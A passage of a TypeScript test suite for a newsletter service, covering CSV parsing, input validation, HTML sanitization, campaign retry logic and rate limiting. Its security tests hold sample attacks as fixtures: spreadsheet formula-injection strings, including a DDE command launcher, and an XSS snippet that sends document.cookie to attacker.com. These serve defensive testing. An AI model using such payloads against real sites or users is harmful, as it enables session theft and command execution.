import test, { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  escapeForCsvExport,
  hashClientIp,
  parseCsvRfc4180,
  parseRateLimitRpcResponse,
  validateNewsletterSubscriptionInput,
} from "../src/lib/newsletter-utils";
import {
  escapeHtml,
  sanitizeEmailHtml,
  buildUnsubscribeUrl,
} from "../src/lib/newsletter-email";

// ─────────────────────────────────────────────────────────────────────────────
// 1. RFC 4180 CSV PARSER & EXPORT SECURITY TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("RFC 4180 CSV Parser & Formula Injection Defense", () => {
  it("should parse standard comma-separated rows", () => {
    const csv = "email,first_name,consent\nalice@example.com,Alice,yes\nbob@example.com,Bob,yes";
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 3);
    assert.deepEqual(rows[0], ["email", "first_name", "consent"]);
    assert.deepEqual(rows[1], ["alice@example.com", "Alice", "yes"]);
    assert.deepEqual(rows[2], ["bob@example.com", "Bob", "yes"]);
  });

  it("should parse fields containing commas inside double quotes", () => {
    const csv = 'email,address,consent\n"user@example.com","House 12, MG Road, New Delhi",yes';
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 2);
    assert.equal(rows[1][1], "House 12, MG Road, New Delhi");
  });

  it("should handle escaped double quotes within quoted fields", () => {
    const csv = 'email,notes,consent\n"artisan@kauseyah.com","Master weaver of ""Patan Patola""",yes';
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 2);
    assert.equal(rows[1][1], 'Master weaver of "Patan Patola"');
  });

  it("should correctly handle multiline fields within double quotes", () => {
    const csv = 'email,bio,consent\n"patron@kauseyah.com","Lover of silk.\nCollector of handloom crafts.",yes';
    const rows = parseCsvRfc4180(csv);
    assert.equal(rows.length, 2);
    assert.equal(rows[1][1], "Lover of silk.\nCollector of handloom crafts.");
  });

  it("should shield against Spreadsheet Formula Injection (CWE-1236)", () => {
    // Malicious formula prefixes: =, +, -, @, \t, \r
    const formulaPayloads = [
      "=cmd|' /C calc'!A0",
      "+1234567890",
      "-5+5",
      "@SUM(A1:A10)",
      "\tDANGEROUS",
      "\rDANGEROUS",
    ];

    for (const payload of formulaPayloads) {
      const exported = escapeForCsvExport(payload);
      // Must start with quote and prepend single quote before the formula trigger
      assert.ok(
        exported.startsWith("\"'") || exported.startsWith("\"''"),
        `Expected ${exported} to be shielded with single quote for payload: ${payload}`
      );
    }

    // Normal safe strings should be enclosed without leading single quote
    const safeStr = escapeForCsvExport("Kauseyah Silk");
    assert.equal(safeStr, '"Kauseyah Silk"');

    // Null or undefined should output empty quoted string
    assert.equal(escapeForCsvExport(null), '""');
    assert.equal(escapeForCsvExport(undefined), '""');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. PUBLIC SUBSCRIPTION INPUT & BOT DEFENSE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Newsletter Subscription Input & Bot Shield Validation", () => {
  it("should successfully validate genuine subscriber payload", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "  Patron@Kauseyah.com  ",
      firstName: "Himani",
      consent: true,
      loadTime: Date.now() - 2500, // 2.5 seconds human fill time
    });

    assert.equal(result.valid, true);
    assert.equal(result.normalizedEmail, "patron@kauseyah.com");
    assert.equal(result.cleanFirstName, "Himani");
  });

  it("should detect and drop honeypot bot submissions silently", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "spammer@botnet.org",
      consent: true,
      honeypot: "http://malicious-link.com",
      loadTime: Date.now() - 5000,
    });

    assert.equal(result.valid, false);
    assert.equal(result.isBot, true);
  });

  it("should detect and drop sub-second automated submissions", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "fastbot@crawler.io",
      consent: true,
      loadTime: Date.now() - 300, // 300ms impossible human fill time
    });

    assert.equal(result.valid, false);
    assert.equal(result.isBot, true);
  });

  it("should reject submissions without explicit affirmative consent", () => {
    const result = validateNewsletterSubscriptionInput({
      email: "user@example.com",
      consent: false,
      loadTime: Date.now() - 3000,
    });

    assert.equal(result.valid, false);
    assert.match(result.error || "", /agree to receive updates/i);
  });

  it("should reject invalid email formats", () => {
    const invalidEmails = [
      "plainaddress",
      "@missingusername.com",
      "user@.com",
      "user@domain..com",
      "user with spaces@domain.com",
    ];

    for (const badEmail of invalidEmails) {
      const res = validateNewsletterSubscriptionInput({
        email: badEmail,
        consent: true,
        loadTime: Date.now() - 2000,
      });
      assert.equal(res.valid, false);
      assert.match(res.error || "", /valid email/i);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. HTML SANITIZATION & INJECTION DEFENSE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Email HTML Sanitization and Escaping", () => {
  it("should escape special characters to prevent HTML injection in text fields", () => {
    const untrusted = `<script>alert("pwned")</script> & 'Craft'`;
    const escaped = escapeHtml(untrusted);
    assert.equal(
      escaped,
      "&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt; &amp; &#39;Craft&#39;"
    );
  });

  it("should strip executable script and event handler tags from campaign HTML", () => {
    const maliciousHtml = `
      <h1>The Kauseyah Journal</h1>
      <p>Our winter silk collection is live.</p>
      <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
      <img src="https://kauseyah.com/silk.jpg" onerror="alert('xss')" />
      <a href="javascript:alert(1)">Click here</a>
      <iframe src="https://malicious.com"></iframe>
    `;

    const sanitized = sanitizeEmailHtml(maliciousHtml);

    assert.ok(!sanitized.includes("<script>"), "Must strip <script> tags");
    assert.ok(!sanitized.includes("onerror"), "Must strip inline event handlers");
    assert.ok(!sanitized.includes("javascript:"), "Must strip javascript: pseudo-protocols");
    assert.ok(!sanitized.includes("<iframe"), "Must strip <iframe> tags");
    assert.ok(sanitized.includes("<h1>The Kauseyah Journal</h1>"), "Must preserve safe header tags");
    assert.ok(sanitized.includes("<img"), "Must preserve safe image tags");
    assert.ok(sanitized.includes("https://kauseyah.com/silk.jpg"), "Must preserve valid image src");
  });

  it("should build valid RFC 8058 compliant unsubscribe URLs", () => {
    const token = "a1b2c3d4e5f678901234567890abcdef";
    const url = buildUnsubscribeUrl(token);
    assert.ok(url.includes("/api/newsletter/unsubscribe?token=" + token));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. CAMPAIGN CLAIMING, RETRY & RECONCILIATION STATE MACHINE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Campaign Claiming & Retry Lifecycle State Machine", () => {
  interface MockRecipientLog {
    id: string;
    email: string;
    status: "pending" | "processing" | "sent" | "failed";
    attempt_count: number;
    updated_at: number;
  }

  function simulateClaimRecipients(
    logs: MockRecipientLog[],
    batchSize: number,
    timeoutMs: number,
    currentTime: number
  ): MockRecipientLog[] {
    const candidates = logs.filter((log) => {
      if (log.status === "pending") return true;
      if (log.status === "failed" && log.attempt_count < 3) return true;
      if (log.status === "processing" && currentTime - log.updated_at > timeoutMs) return true;
      return false;
    });

    // Sort by attempt_count ASC
    candidates.sort((a, b) => a.attempt_count - b.attempt_count);
    const claimed = candidates.slice(0, batchSize);

    for (const c of claimed) {
      c.status = "processing";
      c.attempt_count += 1;
      c.updated_at = currentTime;
    }

    return claimed;
  }

  function simulateReconciliation(logs: MockRecipientLog[]): {
    status: "sending" | "sent" | "partially_failed";
    isComplete: boolean;
    sent: number;
    failed: number;
    pending: number;
    processing: number;
  } {
    const sent = logs.filter((l) => l.status === "sent").length;
    const failed = logs.filter((l) => l.status === "failed").length;
    const pending = logs.filter((l) => l.status === "pending").length;
    const processing = logs.filter((l) => l.status === "processing").length;

    const isComplete = pending === 0 && processing === 0;
    let status: "sending" | "sent" | "partially_failed" = "sending";

    if (isComplete) {
      status = failed > 0 ? "partially_failed" : "sent";
    }

    return { status, isComplete, sent, failed, pending, processing };
  }

  it("should claim pending recipients and increment attempt_count", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "pending", attempt_count: 0, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "pending", attempt_count: 0, updated_at: 1000 },
    ];

    const claimed = simulateClaimRecipients(logs, 10, 300000, 2000);
    assert.equal(claimed.length, 2);
    assert.equal(logs[0].status, "processing");
    assert.equal(logs[0].attempt_count, 1);
    assert.equal(logs[1].status, "processing");
    assert.equal(logs[1].attempt_count, 1);
  });

  it("should allow retrying failed recipients when attempt_count < 3", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "failed", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "failed", attempt_count: 3, updated_at: 1000 }, // Exhausted
    ];

    const claimed = simulateClaimRecipients(logs, 10, 300000, 2000);
    assert.equal(claimed.length, 1);
    assert.equal(claimed[0].id, "1");
    assert.equal(logs[0].attempt_count, 2);
    assert.equal(logs[0].status, "processing");

    // Recipient 2 with attempt_count = 3 must NOT be claimed
    assert.equal(logs[1].status, "failed");
    assert.equal(logs[1].attempt_count, 3);
  });

  it("should reclaim abandoned processing jobs after timeout threshold", () => {
    const now = 500000;
    const timeoutMs = 300000; // 5 minutes
    const logs: MockRecipientLog[] = [
      { id: "1", email: "stalled@kauseyah.com", status: "processing", attempt_count: 1, updated_at: 100000 }, // 400s old > 300s timeout
      { id: "2", email: "active@kauseyah.com", status: "processing", attempt_count: 1, updated_at: 450000 },  // 50s old < 300s timeout
    ];

    const claimed = simulateClaimRecipients(logs, 10, timeoutMs, now);
    assert.equal(claimed.length, 1);
    assert.equal(claimed[0].id, "1");
    assert.equal(logs[0].attempt_count, 2);

    // Active worker job must remain undisturbed
    assert.equal(logs[1].status, "processing");
    assert.equal(logs[1].attempt_count, 1);
  });

  it("must NEVER mark campaign completed while active workers (status: processing) exist", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "sent@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "working@kauseyah.com", status: "processing", attempt_count: 1, updated_at: 2000 },
    ];

    const recon = simulateReconciliation(logs);
    assert.equal(recon.isComplete, false);
    assert.equal(recon.status, "sending");
  });

  it("should mark campaign sent when all recipients are sent and no failures exist", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 2000 },
    ];

    const recon = simulateReconciliation(logs);
    assert.equal(recon.isComplete, true);
    assert.equal(recon.status, "sent");
    assert.equal(recon.sent, 2);
    assert.equal(recon.failed, 0);
  });

  it("should mark campaign partially_failed when retries are exhausted and failures remain", () => {
    const logs: MockRecipientLog[] = [
      { id: "1", email: "a@kauseyah.com", status: "sent", attempt_count: 1, updated_at: 1000 },
      { id: "2", email: "b@kauseyah.com", status: "failed", attempt_count: 3, updated_at: 2000 },
    ];

    const recon = simulateReconciliation(logs);
    assert.equal(recon.isComplete, true);
    assert.equal(recon.status, "partially_failed");
    assert.equal(recon.sent, 1);
    assert.equal(recon.failed, 1);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. SERVERLESS RATE LIMITING STATE MACHINE TESTS
// ─────────────────────────────────────────────────────────────────────────────

describe("Serverless Rate Limiter State Machine", () => {
  interface RateLimitEntry {
    ipHash: string;
    attempts: number;
    lastAttemptAt: number;
    blockedUntil: number | null;
  }

  function evaluateRateLimit(
    entry: RateLimitEntry | undefined,
    currentTime: number,
    maxAttempts = 5,
    windowMs = 15 * 60 * 1000
  ): { allowed: boolean; updatedEntry: RateLimitEntry } {
    if (!entry) {
      return {
        allowed: true,
        updatedEntry: {
          ipHash: "test_ip",
          attempts: 1,
          lastAttemptAt: currentTime,
          blockedUntil: null,
        },
      };
    }

    // Check if blocked
    if (entry.blockedUntil && entry.blockedUntil > currentTime) {
      return { allowed: false, updatedEntry: entry };
    }

    // Check window expiration
    if (currentTime - entry.lastAttemptAt > windowMs) {
      return {
        allowed: true,
        updatedEntry: {
          ...entry,
          attempts: 1,
          lastAttemptAt: currentTime,
          blockedUntil: null,
        },
      };
    }

    // Within window: check threshold
    if (entry.attempts >= maxAttempts) {
      return {
        allowed: false,
        updatedEntry: {
          ...entry,
          attempts: entry.attempts + 1,
          lastAttemptAt: currentTime,
          blockedUntil: currentTime + windowMs,
        },
      };
    }

    return {
      allowed: true,
      updatedEntry: {
        ...entry,
        attempts: entry.attempts + 1,
        lastAttemptAt: currentTime,
      },
    };
  }

  it("should allow the first attempt and increment counter", () => {
    const res = evaluateRateLimit(undefined, 1000, 5, 60000);
    assert.equal(res.allowed, true);
    assert.equal(res.updatedEntry.attempts, 1);
  });

  it("should block when attempts exceed maximum within the window", () => {
    let entry: RateLimitEntry | undefined = undefined;
    const now = 10000;

    // Perform 5 allowed attempts
    for (let i = 1; i <= 5; i++) {
      const res = evaluateRateLimit(entry, now, 5, 60000);
      assert.equal(res.allowed, true);
      entry = res.updatedEntry;
    }

    // 6th attempt must be rejected and set blockedUntil
    const blockedRes = evaluateRateLimit(entry, now, 5, 60000);
    assert.equal(blockedRes.allowed, false);
    assert.ok(blockedRes.updatedEntry.blockedUntil! > now);
  });

  it("should reset the attempt counter after the window expires", () => {
    const entry: RateLimitEntry = {
      ipHash: "test_ip",
      attempts: 4,
      lastAttemptAt: 10000,
      blockedUntil: null,
    };

    // 70 seconds later (window is 60s)
    const futureTime = 10000 + 70000;
    const res = evaluateRateLimit(entry, futureTime, 5, 60000);

    assert.equal(res.allowed, true);
    assert.equal(res.updatedEntry.attempts, 1);
  });

  it("should simulate atomic initial-row upsert under concurrency without lost increments", () => {
    // Simulates the PostgreSQL pattern:
    // 1. INSERT ... ON CONFLICT DO NOTHING (initializes row at attempts: 0 if missing)
    // 2. SELECT ... FOR UPDATE (serializes concurrent transactions)
    const dbRows = new Map<string, RateLimitEntry>();

    function atomicUpsertAndRecord(ipHash: string, now: number, maxAttempts = 5): { allowed: boolean; attempts: number } {
      // Step 1: Ensure row exists
      if (!dbRows.has(ipHash)) {
        dbRows.set(ipHash, { ipHash, attempts: 0, lastAttemptAt: now, blockedUntil: null });
      }

      // Step 2: Row-level lock simulation (serialized per hash)
      const row = dbRows.get(ipHash)!;

      if (row.blockedUntil && row.blockedUntil > now) {
        return { allowed: false, attempts: row.attempts };
      }

      if (row.attempts === 0 || now - row.lastAttemptAt > 60000) {
        row.attempts = 1;
        row.lastAttemptAt = now;
        row.blockedUntil = null;
        return { allowed: true, attempts: 1 };
      }

      row.attempts += 1;
      row.lastAttemptAt = now;
      if (row.attempts > maxAttempts) {
        row.blockedUntil = now + 60000;
        return { allowed: false, attempts: row.attempts };
      }
      return { allowed: true, attempts: row.attempts };
    }

    // Two simultaneous requests for unseen hash
    const req1 = atomicUpsertAndRecord("unseen_ip", 1000);
    const req2 = atomicUpsertAndRecord("unseen_ip", 1000);

    assert.equal(req1.allowed, true);
    assert.equal(req1.attempts, 1);
    assert.equal(req2.allowed, true);
    assert.equal(req2.attempts, 2);
    assert.equal(dbRows.get("unseen_ip")?.attempts, 2);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 6. CONSENT AUDIT ROLLBACK & WORKER CONCURRENCY SIMULATION
// ─────────────────────────────────────────────────────────────────────────────

describe("Consent Audit Compensation & Concurrent Worker Isolation", () => {
  it("should rollback subscriber insertion if consent record fails (compensation logic)", () => {
    interface SubscriberState {
      email: string;
      status: string;
      consentAuditLogged: boolean;
    }

    const subscribers = new Map<string, SubscriberState>();

    function simulateSubscribeWithAudit(
      email: string,
      simulateAuditFailure: boolean
    ): { success: boolean; error?: string } {
      // 1. Insert subscriber
      subscribers.set(email, { email, status: "active", consentAuditLogged: false });

      // 2. Insert consent record
      if (simulateAuditFailure) {
        // Rollback on audit failure
        subscribers.delete(email);
        return { success: false, error: "Failed to securely record subscription consent audit." };
      }

      const sub = subscribers.get(email)!;
      sub.consentAuditLogged = true;
      return { success: true };
    }

    const failedAttempt = simulateSubscribeWithAudit("audit-fail@kauseyah.com", true);
    assert.equal(failedAttempt.success, false);
    assert.equal(subscribers.has("audit-fail@kauseyah.com"), false, "Subscriber must be deleted if audit fails");

    const successAttempt = simulateSubscribeWithAudit("audit-pass@kauseyah.com", false);
    assert.equal(successAttempt.success, true);
    assert.equal(subscribers.get("audit-pass@kauseyah.com")?.consentAuditLogged, true);
  });

  it("should guarantee two concurrent workers never claim the same recipient (SKIP LOCKED simulation)", () => {
    interface RecipientRecord {
      id: string;
      email: string;
      status: "pending" | "processing" | "sent";
    }

    const pool: RecipientRecord[] = Array.from({ length: 15 }, (_, i) => ({
      id: `id-${i}`,
      email: `user${i}@kauseyah.com`,
      status: "pending",
    }));

    // Simulates Worker 1 claiming 10 rows
    const worker1Claimed: RecipientRecord[] = [];
    for (const r of pool) {
      if (worker1Claimed.length >= 10) break;
      if (r.status === "pending") {
        r.status = "processing";
        worker1Claimed.push(r);
      }
    }

    // Simulates Worker 2 claiming remaining rows (skips locked / processing rows)
    const worker2Claimed: RecipientRecord[] = [];
    for (const r of pool) {
      if (worker2Claimed.length >= 10) break;
      if (r.status === "pending") {
        r.status = "processing";
        worker2Claimed.push(r);
      }
    }

    assert.equal(worker1Claimed.length, 10);
    assert.equal(worker2Claimed.length, 5);

    // Verify zero overlap
    const worker1Ids = new Set(worker1Claimed.map((w) => w.id));
    for (const w2 of worker2Claimed) {
      assert.equal(worker1Ids.has(w2.id), false, `Worker 2 claimed item ${w2.id} already claimed by Worker 1`);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 7. NEWSLETTER RATE-LIMITING HARDENING & FAIL-CLOSED SECURITY SUITE
// ─────────────────────────────────────────────────────────────────────────────

describe("Newsletter Rate-Limiting Hardening & Fail-Closed Security", () => {
  // IP Hash & Privacy Protection Tests
  it("hashClientIp should return empty string for missing or unknown IP values", () => {
    assert.equal(hashClientIp(undefined), "");
    assert.equal(hashClientIp(null), "");
    assert.equal(hashClientIp(""), "");
    assert.equal(hashClientIp("   "), "");
    assert.equal(hashClientIp("unknown"), "");
    assert.equal(hashClientIp("null"), "");
    assert.equal(hashClientIp("undefined"), "");
  });

  it("hashClientIp should return salted 32-character hex hash for valid IPs without exposing raw IP", () => {
    const rawIp = "203.0.113.195";
    const salt = "test_secret_salt_123";
    const hash = hashClientIp(rawIp, salt);

    assert.equal(hash.length, 32);
    assert.match(hash, /^[0-9a-f]{32}$/);
    assert.ok(!hash.includes(rawIp), "Hash must never contain raw IP string");

    // Deterministic with same salt
    assert.equal(hashClientIp(rawIp, salt), hash);

    // Changes with different salt
    const differentSaltHash = hashClientIp(rawIp, "different_salt_456");
    assert.notEqual(hash, differentSaltHash);
  });

  // RPC Response Parsing Tests
  it("Scenario 1: parseRateLimitRpcResponse allows when RPC returns allowed: true", () => {
    const result = parseRateLimitRpcResponse([{ allowed: true, attempts: 1 }], null);
    assert.equal(result.allowed, true);
    assert.equal(result.error, undefined);
  });

  it("Scenario 2: parseRateLimitRpcResponse blocks when RPC returns allowed: false", () => {
    const result = parseRateLimitRpcResponse([{ allowed: false, attempts: 6 }], null);
    assert.equal(result.allowed, false);
    assert.equal(
      result.error,
      "Too many subscription attempts from your network. Please wait a few minutes before trying again."
    );
  });

  it("Scenario 3: parseRateLimitRpcResponse fails closed when RPC returns empty array", () => {
    const result = parseRateLimitRpcResponse([], null);
    assert.equal(result.allowed, false);
    assert.equal(
      result.error,
      "Subscription service is temporarily unavailable. Please try again in a few moments."
    );
  });

  it("Scenario 4: parseRateLimitRpcResponse fails closed on null or non-array data", () => {
    const res1 = parseRateLimitRpcResponse(null, null);
    assert.equal(res1.allowed, false);
    assert.equal(
      res1.error,
      "Subscription service is temporarily unavailable. Please try again in a few moments."
    );

    const res2 = parseRateLimitRpcResponse(undefined, null);
    assert.equal(res2.allowed, false);
    assert.equal(
      res2.error,
      "Subscription service is temporarily unavailable. Please try again in a few moments."
    );

    const res3 = parseRateLimitRpcResponse({ allowed: true }, null);
    assert.equal(res3.allowed, false);
    assert.equal(
      res3.error,
      "Subscription service is temporarily unavailable. Please try again in a few moments."
    );
  });

  it("Scenario 5: parseRateLimitRpcResponse fails closed when RPC returns error object", () => {
    const dbError = { message: "connection timeout to database", code: "57014" };
    const result = parseRateLimitRpcResponse(null, dbError);
    assert.equal(result.allowed, false);
    assert.equal(
      result.error,
      "Subscription service is temporarily unavailable. Please try again in a few moments."
    );
  });

  it("Scenario 6: Rate limit helper simulation fails closed when RPC throws exception", async () => {
    async function simulateRpcCall(shouldThrow: boolean) {
      if (shouldThrow) {
        throw new Error("RPC socket hang up or gateway timeout");
      }
      return [{ allowed: true }];
    }

    async function checkRateLimitWithExceptionHandling(shouldThrow: boolean) {
      try {
        const data = await simulateRpcCall(shouldThrow);
        return parseRateLimitRpcResponse(data, null);
      } catch (_err) {
        return {
          allowed: false,
          error: "Subscription service is temporarily unavailable. Please try again in a few moments.",
        };
      }
    }

    const result = await checkRateLimitWithExceptionHandling(true);
    assert.equal(result.allowed, false);
    assert.equal(
      result.error,
      "Subscription service is temporarily unavailable. Please try again in a few moments."
    );
  });

  it("Scenario 7: Missing or unknown IP fails closed without invoking RPC", () => {
    function simulateRateLimitGate(ipHash: string) {
      if (!ipHash || ipHash === "unknown") {
        return {
          allowed: false,
          error: "Unable to verify network security. Please refresh the page and try again.",
        };
      }
      return { allowed: true };
    }

    assert.equal(simulateRateLimitGate("").allowed, false);
    assert.equal(
      simulateRateLimitGate("").error,
      "Unable to verify network security. Please refresh the page and try again."
    );
    assert.equal(simulateRateLimitGate("unknown").allowed, false);
    assert.equal(
      simulateRateLimitGate("unknown").error,
      "Unable to verify network security. Please refresh the page and try again."
    );
  });

  it("Scenario 8: Memory burst shield blocks rapid attempts before hitting database RPC", () => {
    const memoryCache = new Map<string, { attempts: number; resetAt: number }>();

    function simulateBurstShield(ipHash: string, limit = 3, windowMs = 60000, now = Date.now()): boolean {
      if (!ipHash || ipHash === "unknown") return false;
      const entry = memoryCache.get(ipHash);
      if (!entry || now > entry.resetAt) {
        memoryCache.set(ipHash, { attempts: 1, resetAt: now + windowMs });
        return true;
      }
      if (entry.attempts >= limit) {
        return false;
      }
      entry.attempts++;
      return true;
    }

    const testHash = "a1b2c3d4e5f678901234567890abcdef";
    assert.equal(simulateBurstShield(testHash, 3), true); // 1
    assert.equal(simulateBurstShield(testHash, 3), true); // 2
    assert.equal(simulateBurstShield(testHash, 3), true); // 3
    assert.equal(simulateBurstShield(testHash, 3), false); // 4 (Burst blocked!)
  });

  it("Scenario 9: Enforces strict subscriber flow order (Validation -> Rate Limit -> Database)", async () => {
    const executionLog: string[] = [];

    async function simulateSubscriberPipeline(payload: { email: string; consent: boolean; ipHash: string }) {
      executionLog.push("1.validate");
      const validation = validateNewsletterSubscriptionInput({
        email: payload.email,
        consent: payload.consent,
      });
      if (!validation.valid) {
        return { error: validation.error };
      }

      executionLog.push("2.rate_limit");
      if (!payload.ipHash || payload.ipHash === "unknown") {
        return { error: "Unable to verify network security. Please refresh the page and try again." };
      }

      executionLog.push("3.database_insert");
      return { success: true };
    }

    // Attempt with invalid email stops at step 1
    executionLog.length = 0;
    const resInvalid = await simulateSubscriberPipeline({ email: "bad-email", consent: true, ipHash: "valid_hash" });
    assert.equal(resInvalid.error, "Please enter a valid email address.");
    assert.deepEqual(executionLog, ["1.validate"]);

    // Attempt with unverified IP stops at step 2, never touching step 3 (database)
    executionLog.length = 0;
    const resBlockedIp = await simulateSubscriberPipeline({ email: "user@kauseyah.com", consent: true, ipHash: "" });
    assert.equal(resBlockedIp.error, "Unable to verify network security. Please refresh the page and try again.");
    assert.deepEqual(executionLog, ["1.validate", "2.rate_limit"]);

    // Valid attempt executes full pipeline
    executionLog.length = 0;
    const resValid = await simulateSubscriberPipeline({ email: "user@kauseyah.com", consent: true, ipHash: "valid_hash" });
    assert.equal(resValid.success, true);
    assert.deepEqual(executionLog, ["1.validate", "2.rate_limit", "3.database_insert"]);
  });

  it("Scenario 10: Welcome email failure does not roll back an active subscription", async () => {
    let subscriberCreated = false;
    let consentAuditCreated = false;

    async function simulateSubscriptionWithEmailDispatch(emailFails: boolean) {
      // 1. Create subscriber
      subscriberCreated = true;
      // 2. Create consent audit
      consentAuditCreated = true;

      // 3. Welcome email dispatch
      try {
        if (emailFails) {
          throw new Error("Resend API key missing or network unreachable");
        }
      } catch (err) {
        // Non-fatal warning logged, does not roll back subscription
      }

      return {
        success: true,
        message: "Welcome to The Kauseyah Craft Journal! Your welcome note is on its way to your inbox.",
      };
    }

    const result = await simulateSubscriptionWithEmailDispatch(true);
    assert.equal(result.success, true);
    assert.equal(subscriberCreated, true, "Subscriber record must be retained");
    assert.equal(consentAuditCreated, true, "Consent audit record must be retained");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 8. RATE-LIMIT PARAMETER BOUNDARIES & REASON-AWARE FAIL-CLOSED PARSING
// ─────────────────────────────────────────────────────────────────────────────

describe("Rate-Limit Parameter Boundaries & Reason-Aware Fail-Closed Parsing", () => {
  it("hashClientIp must reject whitespace-only and case-insensitive unknown variants", () => {
    assert.equal(hashClientIp("   "), "");
    assert.equal(hashClientIp("unknown"), "");
    assert.equal(hashClientIp("UNKNOWN"), "");
    assert.equal(hashClientIp("  Unknown  "), "");
    assert.equal(hashClientIp("uNkNoWn"), "");
    assert.equal(hashClientIp(null), "");
    assert.equal(hashClientIp(undefined), "");
  });

  it("simulateRateLimitRpcParameterValidation should enforce boundary limits strictly", () => {
    function validateRateLimitRpcParams(
      ipHash: string | null | undefined,
      maxAttempts: number | null | undefined,
      windowMinutes: number | null | undefined
    ): { valid: boolean; error?: string; code?: string } {
      if (maxAttempts === null || maxAttempts === undefined || maxAttempts < 1 || maxAttempts > 100) {
        return { valid: false, error: "Invalid p_max_attempts: must be between 1 and 100", code: "invalid_parameter_value" };
      }
      if (windowMinutes === null || windowMinutes === undefined || windowMinutes < 1 || windowMinutes > 1440) {
        return { valid: false, error: "Invalid p_window_minutes: must be between 1 and 1440", code: "invalid_parameter_value" };
      }
      const trimmed = (ipHash || "").trim().toLowerCase();
      if (!trimmed || trimmed === "unknown") {
        return { valid: true, error: undefined }; // In SQL, invalid IP returns { allowed: false, reason: 'invalid_ip_hash' }
      }
      return { valid: true };
    }

    // Boundary violations
    assert.equal(validateRateLimitRpcParams("hash", null, 15).valid, false);
    assert.equal(validateRateLimitRpcParams("hash", 0, 15).valid, false);
    assert.equal(validateRateLimitRpcParams("hash", -5, 15).valid, false);
    assert.equal(validateRateLimitRpcParams("hash", 101, 15).valid, false);

    assert.equal(validateRateLimitRpcParams("hash", 5, null).valid, false);
    assert.equal(validateRateLimitRpcParams("hash", 5, 0).valid, false);
    assert.equal(validateRateLimitRpcParams("hash", 5, -10).valid, false);
    assert.equal(validateRateLimitRpcParams("hash", 5, 1441).valid, false);

    // Valid boundaries
    assert.equal(validateRateLimitRpcParams("hash", 1, 1).valid, true);
    assert.equal(validateRateLimitRpcParams("hash", 5, 15).valid, true);
    assert.equal(validateRateLimitRpcParams("hash", 100, 1440).valid, true);
  });

  it("parseRateLimitRpcResponse should differentiate invalid_ip_hash from rate_limit_exceeded and blocked", () => {
    // Reason: invalid_ip_hash
    const invalidIpRes = parseRateLimitRpcResponse([{ allowed: false, reason: "invalid_ip_hash" }], null);
    assert.equal(invalidIpRes.allowed, false);
    assert.equal(invalidIpRes.error, "Unable to verify network security. Please refresh the page and try again.");
    assert.equal(invalidIpRes.reason, "invalid_ip_hash");

    // Reason: rate_limit_exceeded
    const rateLimitRes = parseRateLimitRpcResponse([{ allowed: false, reason: "rate_limit_exceeded" }], null);
    assert.equal(rateLimitRes.allowed, false);
    assert.equal(rateLimitRes.error, "Too many subscription attempts from your network. Please wait a few minutes before trying again.");
    assert.equal(rateLimitRes.reason, "rate_limit_exceeded");

    // Reason: blocked
    const blockedRes = parseRateLimitRpcResponse([{ allowed: false, reason: "blocked" }], null);
    assert.equal(blockedRes.allowed, false);
    assert.equal(blockedRes.error, "Too many subscription attempts from your network. Please wait a few minutes before trying again.");
    assert.equal(blockedRes.reason, "blocked");

    // Allowed: true
    const allowedRes = parseRateLimitRpcResponse([{ allowed: true, reason: "first_attempt" }], null);
    assert.equal(allowedRes.allowed, true);
    assert.equal(allowedRes.error, undefined);
    assert.equal(allowedRes.reason, "first_attempt");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 9. CLAIM RPC VALIDATION & NULL-SAFE AUTHORIZATION
// ─────────────────────────────────────────────────────────────────────────────

describe("Claim RPC Validation & Null-Safe Authorization", () => {
  function validateClaimRpcParams(
    batchSize: number | null | undefined,
    timeoutSeconds: number | null | undefined
  ): { valid: boolean; error?: string } {
    if (batchSize === null || batchSize === undefined || batchSize < 1 || batchSize > 100) {
      return { valid: false, error: "Invalid p_batch_size: must be an integer between 1 and 100" };
    }
    if (timeoutSeconds === null || timeoutSeconds === undefined || timeoutSeconds < 30 || timeoutSeconds > 3600) {
      return { valid: false, error: "Invalid p_timeout_seconds: must be an integer between 30 and 3600" };
    }
    return { valid: true };
  }

  it("should reject claim parameters outside boundary bounds", () => {
    assert.equal(validateClaimRpcParams(null, 300).valid, false);
    assert.equal(validateClaimRpcParams(0, 300).valid, false);
    assert.equal(validateClaimRpcParams(-10, 300).valid, false);
    assert.equal(validateClaimRpcParams(101, 300).valid, false);

    assert.equal(validateClaimRpcParams(15, null).valid, false);
    assert.equal(validateClaimRpcParams(15, 29).valid, false);
    assert.equal(validateClaimRpcParams(15, 0).valid, false);
    assert.equal(validateClaimRpcParams(15, 3601).valid, false);

    // Valid boundaries
    assert.equal(validateClaimRpcParams(1, 30).valid, true);
    assert.equal(validateClaimRpcParams(15, 300).valid, true);
    assert.equal(validateClaimRpcParams(100, 3600).valid, true);
  });

